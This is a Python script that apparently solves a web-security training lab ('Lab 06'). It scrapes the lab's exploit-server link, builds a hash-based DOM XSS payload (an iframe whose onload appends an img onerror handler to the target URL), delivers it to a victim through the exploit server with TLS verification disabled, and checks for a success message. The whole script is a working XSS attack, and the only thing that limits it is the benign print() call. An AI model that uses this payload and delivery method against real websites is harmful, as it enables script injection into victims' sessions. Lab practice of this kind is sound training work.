import argparse
import requests
import urllib3
from urllib.parse import urljoin
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_exploit_server(url, proxies=None):
    try:
        response = requests.get(url, proxies=proxies, verify=False, timeout=30)
        soup = BeautifulSoup(response.text, 'html.parser')
        exploit_link = soup.find('a', string='Go to exploit server')
        return exploit_link['href'] if exploit_link else None
    except Exception as e:
        print(f"Error finding exploit server: {e}")
        return None

def xss_test(url, use_proxy=False):
    try:
        proxies = {
            'http': '127.0.0.1:8080',        
            'https': '127.0.0.1:8080'
        } if use_proxy else None
        
        exploit_server = get_exploit_server(url, proxies)
        if not exploit_server:
            print("Could not find exploit server link")
            return False, None
            
        payload = '<iframe src="' + url + '#" onload="this.src+=\'<img src=x onerror=print()>\'"></iframe>'
        
        data = {
            'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': 'HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8',
            'responseBody': payload,
            'formAction': 'DELIVER_TO_VICTIM'
        }
        
        print(f"Sending payload to exploit server")
        requests.post(exploit_server, data=data, proxies=proxies, verify=False, timeout=30)
        
        return is_solved(url, proxies)
            
    except requests.exceptions.RequestException as e:
        print(f"Error during XSS test: {e}")
        return False, None

def is_solved(url, proxies):
    try:
        response = requests.get(url, proxies=proxies, verify=False, timeout=30)
        if response.status_code != 200:
            return False, response
            
        soup = BeautifulSoup(response.text, 'html.parser')
        success_message = soup.find(string=lambda text: 'congratulations' in text.lower() if text else False)
        return bool(success_message), response
    except Exception as e:
        print(f"Error checking solution: {e}")
        return False, None

def main():
    parser = argparse.ArgumentParser(description='XSS Test for Lab 06')
    parser.add_argument('-u', '--url', required=True, help='Target URL (Example: https://example.com/)')
    parser.add_argument('-p', '--proxy', action='store_true', help='Use proxy (127.0.0.1:8080)')
    args = parser.parse_args()
    
    if not args.url.endswith('/'):
        args.url += '/'
    
    print("Starting XSS Test...")
    print(f"Target URL: {args.url}")
    
    success, response = xss_test(args.url, args.proxy)
    if success:
        print("XSS Lab completed successfully!")
    else:
        print("XSS Lab failed.")
        if response:
            print(f"HTTP Status Code: {response.status_code}")
            print(f"Response Length: {len(response.text)}")

if __name__ == "__main__":
    main()
